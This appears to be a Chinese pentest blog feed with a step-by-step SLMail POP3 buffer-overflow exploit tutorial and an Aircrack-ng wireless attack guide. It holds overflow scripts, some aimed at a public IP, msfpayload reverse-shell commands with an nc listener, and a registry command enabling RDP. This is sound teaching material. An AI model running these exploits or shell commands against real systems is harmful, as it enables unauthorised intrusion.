class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 39694438</code>    #计算EIP寄存器内存地址ASCII码在2700唯一字符串中的偏移量</p><blockquote><h4 id="python代码05-py"><a href="#python代码05-py" class="headerlink" title="python代码05.py"></a>python代码<code>05.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">20</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>思路:<br>将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,将跳转到shellcode代码段并执行；<br>寻找可存放shellcode的内存空间</p><blockquote><h4 id="python代码06-py"><a href="#python代码06-py" class="headerlink" title="python代码06.py"></a>python代码<code>06.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*(<span class="number">3500</span><span class="number">-2606</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>不同类型的程序,协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途<br>    返回地址,Shellcode,buffer中都不能出现坏字符<br>    null byte (0x00) 空字符,用于终止字符串的拷贝操作<br>    return (0x0D)回车操作,表示POP3 PASS命令输入完成<br>    思路:发送0x00—-0xff 256个字符,查找所有坏字符<br>    00000000 11111111 256 #二进制</p><blockquote><h4 id="python代码07-py"><a href="#python代码07-py" class="headerlink" title="python代码07.py"></a>python代码<code>07.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span></span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span></span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span></span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span></span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span></span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span></span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><pre><code>0x0A    0x0D    0x00    #坏字符</code></pre><p>重定向数据流<br>    用ESP的地址替换EIP的值<br>    但是ESP地址变化,硬编码不可行<br>    SLMaail线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定<br>变通思路<br>    在内存中寻找地址固定的系统模块<br>    在模块中寻找JMP ESP 指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode<br>    mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块<br>    寻找无DEP,ALSR保护的内存地址<br>    内存地址不包含坏字符<br>    寻找不受保护的系统模块<br>        !mona modules<br>    将汇编指令jmp esp 转换为二进制<br>        <code>/usr/share/metasploit-framework/tools/exploit/masm_shell.rb</code><br>        FFE4<br>    在模块中搜索FFE4指令<br>    <code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code><br>        选择不包含坏字符的内存地址<br>    在该地址设置断点<br>    重发buffer</p><blockquote><h4 id="python代码08-py-地址全翻转"><a href="#python代码08-py-地址全翻转" class="headerlink" title="python代码08.py(地址全翻转)"></a>python代码<code>08.py</code>(地址全翻转)</h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"C"</span>*<span class="number">390</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4></blockquote><p><code>Scratch</code>        #写shellcode的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfpayload -l</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 C</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;</span><br><span class="line">nc -vip 443</span><br></pre></td></tr></table></figure><blockquote><h4 id="python代码09-py"><a href="#python代码09-py" class="headerlink" title="python代码09.py"></a>python代码<code>09.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span>+</span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span>+</span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span>+</span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span>+</span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span>+</span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span>+</span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span>+</span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span>+</span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span>+</span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span>+</span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span>+</span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span>+</span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span>+</span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span>+</span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span>+</span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"\x90"</span>*<span class="number">8</span>+shellcode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>shellcode执行结束后以ExitProcess方式推出整个进程,将导致邮件服务崩溃；<br>Slmail是一个基于线程的应用,适用ExitThread方式可以避免整个服务崩溃,可实现重复溢出；<br><code>./msfpayload win32_reverse lhost=1.1.1.1 EXITFUNC=thread lport=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code><br>    cmd注册表开启3389<br>    <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>    RegSnap #工具</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Buffer overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aircrack-ng无线攻击套件</title>
      <link href="/2013/06/12/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/"/>
      <url>/2013/06/12/Wireless_Attacks/Aircrack-ng%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E5%A5%97%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a><strong>AIRCRACK-NG基础</strong></h3></blockquote><p>无线渗透和审计神器<br>包含各种功能的工具套件<br>    网络检测<br>    嗅探抓包<br>    包注入<br>    密码破解</p><blockquote><h4 id="AIRMON-NG"><a href="#AIRMON-NG" class="headerlink" title="AIRMON-NG"></a>AIRMON-NG</h4></blockquote><p>检查完网卡驱动<br>    airmon-ng    #检查无线网卡驱动及芯片型号</p><blockquote><h5 id="开启和停止无线侦听"><a href="#开启和停止无线侦听" class="headerlink" title="开启和停止无线侦听"></a>开启和停止无线侦听</h5></blockquote><pre><code>airmon-ng check            #检查aircrack-ng套件和当前使用系统的兼容性airmon-ng check kill    #kill掉影响aircrack-ng使用的进程airmon-ng start wlan2 3    #开启无线网卡侦听,并指定3信道iwlist wlan2mon channel    #查看工作信道airmon-ng stop wlan2mon    #停止无线侦听</code></pre><blockquote><h4 id="AIRODUMP-NG"><a href="#AIRODUMP-NG" class="headerlink" title="AIRODUMP-NG"></a>AIRODUMP-NG</h4><pre><code>无线抓包airodump-ng wlan2mon    #扫描发现每一个信道里的APairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap #抓指定信道1,指定AP的数据,并写入文件aireplay -9 wlan2mon airreplay</code></pre></blockquote><pre><code>airodump-ng wlan2monairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.capairodump-ng wlan2mon -c 1 --bssid 00:11:22:33:44:55 -w file.cap --ivs</code></pre><p>BSSID:AP的MAC地址<br>PWR:网卡接收到的信号强度,距离越近信号越强<br>    -1:驱动不支持信号强度,STA距离超出信号接受范围<br>RXQ:最近10秒成功接收的数据帧的百分比(数据帧,管理帧),只有在固定信道时才会出现.<br>Beacons:接收到此AP发送的beacon帧数量<br>Data:抓到的数据帧数量(WEP表示IV数量),包含广播数据帧<br>/s:最近10秒内,每秒平均抓到的帧的数量<br>CH:信道号(从beacon帧中获得),信道重叠时可能发现其它信道<br>MB:AP支持的最大速率<br>ENC:采用的无线安全技术 WEP,WPA,WPA2,OPEN</p><p>CIPHER:采用的加密套件CCMP,TKIP,WEP40,WEP104<br>AUTH:身份认证方法MGT,PSK,SKA,OPEN<br>ESSID:无线网络名称,隐藏AP此值可能为空,airodump从probe和association request帧中发现隐藏AP<br>STATION:STA的MAC地址<br>Lost:通过sequence number判断最近10秒STA发送丢失的数据包数量(管理帧,数据帧)<br>    干扰,距离<br>    发包不能收,收包不能发<br>Packets:STA发送的数据包数量<br>Probes:STA探测的ESSID</p><blockquote><h4 id="AIRODUMP-NG排错"><a href="#AIRODUMP-NG排错" class="headerlink" title="AIRODUMP-NG排错"></a>AIRODUMP-NG排错</h4></blockquote><p>不显示任何AP和STA信息<br>    物理机场景下使用笔记本内置无线网卡时,确保BIOS中已启用无线网卡<br>    确认无线网卡在managed模式下可以正常工作<br>    尝试禁用network-manager服务<br>    尝试卸载rmmod和重新加载modprobe驱动<br>工作一段时间后airodump-ng无法继续抓包<br>    airmon-ng check kill<br>    确认wpa_supplicant进程已停止</p><blockquote><h4 id="AIREPLAY-NG"><a href="#AIREPLAY-NG" class="headerlink" title="AIREPLAY-NG"></a>AIREPLAY-NG</h4></blockquote><p>产生或者加速无线通信流量<br>    向无线网络中注入数据包<br>        伪造身份验证<br>        强制重新身份验证<br>        抓包重放<br>    用于后续WEP和WPA密码破解<br>    支持10种包注入<br>    获取包的两种途径<br>        指定接口(-i)<br>        抓包文件pcap(-r)</p><pre><code>aireplay-ng &lt;options&gt;&lt;interface name&gt;</code></pre><p>Filter命令选项(除0,1两种攻击方式)<br>Replay命令选项</p><p>AIREPLAY-NG排错<br>    Aireplay-ng命令挂起没有任何输出<br>        无线网卡与AP工作在不同信道<br>    报错”write failed:Cannot allocate memory wi_write():illegal seek”<br>        无线网卡使用Broadcom芯片(bcm43xx),替换为b43驱动可解决<br>    可注入但速度很慢,并提示内核消息”rtc:lost some interrupts at 1024Hz”<br>        